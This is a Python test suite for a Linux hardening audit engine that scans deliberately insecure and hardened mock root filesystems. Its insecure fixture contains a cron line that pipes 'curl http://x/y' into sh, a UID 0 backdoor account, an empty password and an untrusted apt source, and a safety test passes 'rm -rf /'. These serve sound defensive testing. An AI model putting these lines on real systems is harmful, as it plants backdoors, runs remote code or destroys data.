#!/usr/bin/env python3
"""Tests for the Torvex audit engine.

Every test builds a throwaway root filesystem, so results do not depend on the
host running the tests. Run with:

    python3 -m unittest discover -s python -v
"""

from __future__ import annotations

import json
import os
import stat
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import torvex_audit as audit  # noqa: E402


def write(root: Path, relative: str, content: str, mode: int = 0o644) -> None:
    path = root / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content)
    os.chmod(path, mode)


def insecure_root(root: Path) -> None:
    write(
        root,
        "etc/passwd",
        "root:x:0:0:root:/root:/bin/bash\n"
        "toor:x:0:0:backdoor:/root:/bin/bash\n"
        "svc:x:999:999:service:/var/lib/svc:/bin/bash\n"
        "guest:x:1000:1000:guest:/home/guest:/bin/bash\n",
        0o666,
    )
    write(
        root,
        "etc/shadow",
        "root:*:19000:0:99999:7:::\n"
        "guest::19000:0:99999:7:::\n",
        0o644,
    )
    write(
        root,
        "etc/login.defs",
        "PASS_MAX_DAYS 99999\n"
        "PASS_MIN_DAYS 0\n"
        "ENCRYPT_METHOD MD5\n"
        "UMASK 022\n",
    )
    write(root, "etc/sudoers", "%sudo ALL=(ALL) NOPASSWD: ALL\n", 0o666)
    write(
        root,
        "etc/ssh/sshd_config",
        "PermitRootLogin yes\n"
        "PasswordAuthentication yes\n"
        "PermitEmptyPasswords yes\n"
        "X11Forwarding yes\n"
        "MaxAuthTries 10\n"
        "Protocol 1\n"
        "Ciphers 3des-cbc,aes128-cbc\n"
        "MACs hmac-md5\n",
        0o666,
    )
    write(root, "etc/ufw/ufw.conf", "ENABLED=no\n")
    write(
        root,
        "etc/sysctl.conf",
        "net.ipv4.ip_forward=1\n"
        "kernel.randomize_va_space=0\n"
        "kernel.dmesg_restrict=0\n",
    )
    write(root, "etc/fstab", "/dev/sda1 /tmp ext4 defaults 0 0\n")
    write(root, "var/log/syslog", "log\n", 0o666)
    (root / "tmp").mkdir(parents=True, exist_ok=True)
    os.chmod(root / "tmp", 0o777)
    write(root, "etc/crontab", "* * * * * root curl http://x/y | sh\n", 0o666)
    write(root, "etc/ssl/openssl.cnf", "[system_default_sect]\nMinProtocol = TLSv1\nSSLv3\n")
    write(root, "etc/os-release", 'ID=debian\nVERSION_ID="12"\n')
    write(root, "etc/apt/sources.list.d/evil.list", "deb [trusted=yes] http://x/y stable main\n")
    write(root, "etc/systemd/journald.conf", "Storage=volatile\n")


def hardened_root(root: Path) -> None:
    write(
        root,
        "etc/passwd",
        "root:x:0:0:root:/root:/bin/bash\n"
        "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
        "svc:x:999:999:service:/var/lib/svc:/usr/sbin/nologin\n"
        "ops:x:1000:1000:ops:/home/ops:/bin/bash\n",
    )
    write(root, "etc/shadow", "root:$y$j9T$abc:19000:0:90:7:30:30:\n", 0o640)
    write(
        root,
        "etc/login.defs",
        "PASS_MAX_DAYS 90\n"
        "ENCRYPT_METHOD SHA512\n"
        "SHA_CRYPT_MIN_ROUNDS 65536\n"
        "UMASK 027\n",
    )
    write(root, "etc/sudoers", "root ALL=(ALL:ALL) ALL\n", 0o440)
    write(
        root,
        "etc/ssh/sshd_config",
        "PermitRootLogin no\n"
        "PasswordAuthentication no\n"
        "PermitEmptyPasswords no\n"
        "X11Forwarding no\n"
        "MaxAuthTries 3\n"
        "ClientAliveInterval 300\n"
        "ClientAliveCountMax 2\n"
        "Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com\n",
        0o600,
    )
    write(root, "etc/ufw/ufw.conf", "ENABLED=yes\n")
    write(root, "etc/iptables/rules.v4", ":INPUT DROP [0:0]\n:FORWARD DROP [0:0]\n")
    write(
        root,
        "etc/sysctl.d/99-hardening.conf",
        "net.ipv4.ip_forward=0\n"
        "kernel.randomize_va_space=2\n"
        "net.ipv4.tcp_syncookies=1\n"
        "net.ipv4.conf.all.rp_filter=1\n"
        "kernel.dmesg_restrict=1\n"
        "kernel.kptr_restrict=2\n"
        "fs.suid_dumpable=0\n"
        "net.ipv4.conf.all.accept_redirects=0\n"
        "kernel.yama.ptrace_scope=1\n",
    )
    write(root, "etc/fstab", "/dev/sda1 /tmp ext4 rw,nosuid,nodev,noexec 0 0\n")
    write(root, "var/log/syslog", "log\n", 0o640)
    (root / "tmp").mkdir(parents=True, exist_ok=True)
    os.chmod(root / "tmp", 0o1777)
    write(root, "etc/crontab", "SHELL=/bin/sh\n", 0o600)
    write(root, "etc/cron.allow", "root\n", 0o600)
    write(root, "etc/ssl/openssl.cnf", "[system_default_sect]\nMinProtocol = TLSv1.2\n")
    write(root, "etc/os-release", 'ID=debian\nVERSION_ID="12"\n')
    write(root, "etc/audit/auditd.conf", "log_file = /var/log/audit/audit.log\n")
    write(root, "etc/audit/rules.d/base.rules", "-a always,exit -F arch=b64 -S execve\n")
    write(root, "etc/fail2ban/jail.local", "[sshd]\nenabled = true\n")
    write(root, "etc/selinux/config", "SELINUX=enforcing\n")
    write(root, "etc/systemd/journald.conf", "Storage=persistent\n")
    write(root, "etc/pam.d/common-password", "password requisite pam_pwquality.so retry=3\n")
    write(root, "etc/apt/apt.conf.d/20auto-upgrades", 'APT::Periodic::Unattended-Upgrade "1";\n')
    write(root, "usr/sbin/ufw", "placeholder\n", 0o755)
    write(root, "etc/ssh/ssh_host_ed25519_key", "key\n", 0o600)


def run(root: Path, policy: dict | None = None) -> dict:
    context = audit.Context(str(root), audit.merge_policy(audit.DEFAULT_POLICY, policy))
    return audit.run_audit(context)


def result_map(report: dict) -> dict[str, dict]:
    return {item["id"]: item for item in report["results"]}


class ControlCatalogueTests(unittest.TestCase):
    def test_ids_are_unique_and_well_formed(self) -> None:
        ids = [item.id for item in audit.CONTROLS]
        self.assertEqual(len(ids), len(set(ids)), "control ids must be unique")
        for control_id in ids:
            self.assertRegex(control_id, r"^[A-Z]{3,4}-\d{4}$")

    def test_every_control_declares_guidance(self) -> None:
        for item in audit.CONTROLS:
            self.assertTrue(item.rationale, f"{item.id} needs a rationale")
            self.assertTrue(item.remediation, f"{item.id} needs remediation")
            self.assertGreater(item.weight, 0, f"{item.id} needs a positive weight")

    def test_catalogue_covers_every_category(self) -> None:
        categories = {item.category for item in audit.CONTROLS}
        self.assertTrue(
            {"SSH", "FIRE", "KRNL", "AUTH", "ACCT", "FILE", "LOGG"} <= categories
        )
        self.assertGreaterEqual(len(audit.CONTROLS), 35)


class InsecureHostTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.temp = tempfile.TemporaryDirectory()
        cls.root = Path(cls.temp.name)
        insecure_root(cls.root)
        cls.report = run(cls.root)
        cls.results = result_map(cls.report)

    @classmethod
    def tearDownClass(cls) -> None:
        cls.temp.cleanup()

    def test_reports_low_hardening_index(self) -> None:
        self.assertLess(self.report["score"]["index"], 60)
        self.assertEqual(self.report["schema"], audit.SCHEMA)
        self.assertEqual(self.report["root"], str(self.root.resolve()))

    def test_critical_findings(self) -> None:
        expected = {
            "ACCT-9001": "failed",
            "ACCT-9002": "failed",
            "SSH-7401": "failed",
            "SSH-7403": "failed",
            "FILE-6311": "failed",
            "FILE-6312": "failed",
            "AUTH-9233": "failed",
            "AUTH-9234": "failed",
            "FIRE-4501": "failed",
            "MAND-0100": "failed",
        }
        for control_id, status in expected.items():
            self.assertEqual(
                self.results[control_id]["status"],
                status,
                f"{control_id}: {self.results[control_id]['evidence']}",
            )

    def test_suggestions_are_not_failures(self) -> None:
        self.assertEqual(self.results["KRNL-6000"]["status"], "suggestion")
        self.assertEqual(self.results["ACCT-9004"]["status"], "suggestion")

    def test_findings_carry_actionable_metadata(self) -> None:
        finding = self.results["SSH-7401"]
        self.assertEqual(finding["severity"], "high")
        self.assertEqual(finding["level"], 8)
        self.assertIn("PermitRootLogin", finding["evidence"])
        self.assertTrue(finding["remediation"])
        self.assertIn("CIS 5.2.8", finding["compliance"])
        self.assertIn("T1078", finding["mitre"])
        self.assertEqual(finding["target"], "/etc/ssh/sshd_config")

    def test_score_is_a_ratio_not_a_grade(self) -> None:
        score = self.report["score"]
        self.assertGreater(score["possible"], 0)
        self.assertAlmostEqual(
            score["index"], round(100 * score["earned"] / score["possible"]), delta=1
        )
        self.assertTrue(score["below_policy"])

    def test_counts_match_results(self) -> None:
        counts = self.report["counts"]
        for status in ("passed", "failed", "suggestion", "skipped", "manual"):
            self.assertEqual(
                counts[status],
                sum(1 for item in self.report["results"] if item["status"] == status),
            )


class HardenedHostTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.temp = tempfile.TemporaryDirectory()
        cls.root = Path(cls.temp.name)
        hardened_root(cls.root)
        cls.report = run(cls.root)
        cls.results = result_map(cls.report)

    @classmethod
    def tearDownClass(cls) -> None:
        cls.temp.cleanup()

    def test_hardened_host_scores_high(self) -> None:
        self.assertGreaterEqual(self.report["score"]["index"], 90)
        self.assertFalse(self.report["score"]["below_policy"])
        self.assertEqual(self.report["score"]["grade"], "A")

    def test_previously_failing_controls_pass(self) -> None:
        expected = [
            "ACCT-9001",
            "ACCT-9002",
            "ACCT-9003",
            "SSH-7401",
            "SSH-7402",
            "SSH-7403",
            "FILE-6310",
            "FILE-6311",
            "FILE-6312",
            "AUTH-9230",
            "AUTH-9233",
            "AUTH-9234",
            "FIRE-4500",
            "FIRE-4501",
            "FIRE-4502",
            "KRNL-6000",
            "KRNL-6001",
            "LOGG-2139",
            "MAND-0100",
            "CRYP-8001",
        ]
        for control_id in expected:
            self.assertEqual(
                self.results[control_id]["status"],
                "passed",
                f"{control_id}: {self.results[control_id]['evidence']}",
            )

    def test_no_warnings_remain(self) -> None:
        warnings = [item for item in self.report["results"] if item["status"] == "failed"]
        self.assertEqual(warnings, [], f"unexpected warnings: {warnings}")

    def test_categories_are_scored(self) -> None:
        categories = {item["id"]: item for item in self.report["categories"]}
        self.assertIn("SSH", categories)
        self.assertEqual(categories["SSH"]["score"], 100)


class PolicyTests(unittest.TestCase):
    def test_skipping_a_control_removes_it(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            insecure_root(root)
            report = run(root, {"disabled_checks": ["SSH-7401", "ACCT-9001"]})
            ids = {item["id"] for item in report["results"]}
            self.assertNotIn("SSH-7401", ids)
            self.assertNotIn("ACCT-9001", ids)
            self.assertIn("SSH-7402", ids)

    def test_category_can_be_disabled(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            insecure_root(root)
            report = run(root, {"categories": {"SCHD": {"enabled": False}}})
            self.assertFalse(
                [item for item in report["results"] if item["category"] == "SCHD"]
            )

    def test_severity_override_is_applied(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            insecure_root(root)
            report = run(root, {"severity_overrides": {"SSH-7401": "critical"}})
            finding = result_map(report)["SSH-7401"]
            self.assertEqual(finding["severity"], "critical")
            self.assertEqual(finding["level"], 10)

    def test_policy_weights_scale_available_points(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            insecure_root(root)
            baseline = run(root)
            weighted = run(root, {"categories": {"SSH": {"weight": 5.0}}})

            baseline_ssh = {item["id"]: item for item in baseline["categories"]}["SSH"]
            weighted_ssh = {item["id"]: item for item in weighted["categories"]}["SSH"]
            default_weight = audit.DEFAULT_POLICY["categories"]["SSH"]["weight"]
            self.assertAlmostEqual(
                weighted_ssh["possible"],
                baseline_ssh["possible"] / default_weight * 5,
                delta=0.1,
            )
            self.assertGreater(weighted["score"]["possible"], baseline["score"]["possible"])
            self.assertLessEqual(weighted["score"]["index"], 100)

    def test_merge_does_not_mutate_the_default(self) -> None:
        before = json.dumps(audit.DEFAULT_POLICY, sort_keys=True)
        audit.merge_policy(audit.DEFAULT_POLICY, {"categories": {"SSH": {"weight": 9}}})
        self.assertEqual(before, json.dumps(audit.DEFAULT_POLICY, sort_keys=True))


class CommandLineTests(unittest.TestCase):
    def run_cli(self, *args: str) -> subprocess.CompletedProcess:
        return subprocess.run(
            [sys.executable, str(Path(__file__).resolve().parent / "torvex_audit.py"), *args],
            capture_output=True,
            text=True,
            check=False,
        )

    def test_json_output_is_parseable(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            hardened_root(root)
            completed = self.run_cli("--root", directory, "--format", "json")
            self.assertEqual(completed.returncode, 0, completed.stderr)
            report = json.loads(completed.stdout)
            self.assertEqual(report["engine"], "torvex_audit")
            self.assertGreater(report["score"]["index"], 0)
            self.assertTrue(report["live"] is False)

    def test_output_file_and_skip_flags(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            insecure_root(root)
            target = root / "report.json"
            completed = self.run_cli(
                "--root", directory, "--output", str(target), "--skip", "SSH-7401"
            )
            self.assertEqual(completed.returncode, 0, completed.stderr)
            report = json.loads(target.read_text())
            self.assertNotIn("SSH-7401", {item["id"] for item in report["results"]})

    def test_list_prints_every_control(self) -> None:
        completed = self.run_cli("--list")
        self.assertEqual(completed.returncode, 0, completed.stderr)
        lines = [line for line in completed.stdout.splitlines() if line.strip()]
        self.assertEqual(len(lines), len(audit.CONTROLS))

    def test_plugin_can_add_a_control(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            insecure_root(root)
            plugin = root / "plugin.py"
            plugin.write_text(
                "from torvex_audit import Outcome, Severity\n"
                "@control('PLUG-0001', 'Plugin control', 'FILE', Severity.LOW,\n"
                "         rationale='test', remediation='none')\n"
                "def plugin_check(context):\n"
                "    return Outcome.ok('plugin ran')\n"
            )
            completed = self.run_cli("--root", directory, "--plugin", str(plugin))
            self.assertEqual(completed.returncode, 0, completed.stderr)
            report = json.loads(completed.stdout)
            self.assertIn("PLUG-0001", {item["id"] for item in report["results"]})

    def test_bad_policy_is_rejected(self) -> None:
        completed = self.run_cli("--policy", "/nonexistent/policy.json")
        self.assertNotEqual(completed.returncode, 0)
        self.assertIn("does not exist", completed.stderr)


class SafetyTests(unittest.TestCase):
    def test_path_escape_is_refused(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            context = audit.Context(directory)
            self.assertIsNone(context.path("../../etc/shadow"))
            self.assertIsNone(context.read("../../etc/shadow"))

    def test_commands_refuse_to_run_against_a_snapshot(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            context = audit.Context(directory)
            code, output = context.command(("uname", "-s"))
            self.assertEqual(code, 127)
            self.assertEqual(output, "")

    def test_only_allowlisted_commands_run(self) -> None:
        context = audit.Context("/")
        code, _ = context.command(("rm", "-rf", "/"))
        self.assertEqual(code, 127)

    def test_oversized_file_is_capped(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            big = root / "etc" / "big.conf"
            big.parent.mkdir(parents=True)
            big.write_text("a" * (audit.MAX_READ + 100))
            context = audit.Context(directory)
            self.assertEqual(len(context.read("etc/big.conf") or ""), audit.MAX_READ)


class RobustnessTests(unittest.TestCase):
    def test_empty_root_does_not_crash(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            report = run(Path(directory))
            self.assertTrue(report["results"])
            self.assertLessEqual(report["score"]["index"], 100)
            results = result_map(report)
            # Absent subjects are inapplicable, not silently passing.
            self.assertEqual(results["SSH-7401"]["status"], "skipped")
            self.assertEqual(results["SSH-7403"]["status"], "skipped")
            self.assertEqual(results["KRNL-6000"]["status"], "skipped")

    def test_results_are_serialisable(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            report = run(Path(directory))
            json.dumps(report)  # must not raise

    def test_missing_shadow_is_skipped_not_failed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            report = run(Path(directory))
            self.assertEqual(result_map(report)["ACCT-9002"]["status"], "skipped")


if __name__ == "__main__":
    unittest.main(verbosity=2)
